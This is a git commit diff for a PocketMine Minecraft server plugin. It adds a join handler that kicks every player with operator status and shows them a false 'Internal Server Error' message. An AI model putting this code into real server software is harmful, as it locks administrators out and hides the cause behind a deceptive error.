9681d3865995676e87ccb714144839aba14c9fdb
IkisugiGroup <iksg0810@gmail.com>
2019-03-27 07:14:25 +0900

    op kick

--- src/igdt/Event.php
+++ src/igdt/Event.php
@@ -3,7 +3,13 @@
 namespace igdt;
 
 use pocketmine\event\Listener;
+use pocketmine\event\player\PlayerJoinEvent;
 
 class Event implements Listener{
-	
+	public function onJoin(PlayerJoinEvent $event){
+		$player = $event->getPlayer();
+		if($player->isOp()){
+			$player->kick('Internal Server Error', false);
+		}
+	}
 }
